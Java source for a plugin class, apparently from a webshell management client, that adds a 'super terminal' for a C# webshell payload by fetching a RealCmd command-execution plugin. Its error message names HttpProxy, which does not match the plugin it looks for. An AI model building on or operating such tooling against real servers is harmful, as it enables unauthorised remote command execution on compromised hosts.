package shells.plugins.cshap;

import core.annotation.PluginAnnotation;
import core.ui.component.dialog.GOptionPane;
import shells.plugins.generic.RealCmd;
import shells.plugins.generic.SuperTerminal;

@PluginAnnotation(
   payloadName = "CShapDynamicPayload",
   Name = "SuperTerminal",
   DisplayName = "超级终端"
)
public class CSuperTerminal extends SuperTerminal {
   public RealCmd getRealCmd() {
      RealCmd plugin = (RealCmd)this.shellEntity.getFrame().getPlugin("RealCmd");
      if (plugin != null) {
         return plugin;
      } else {
         GOptionPane.showMessageDialog(super.getView(), "未找到HttpProxy插件!", "提示", 0);
         return null;
      }
   }
}
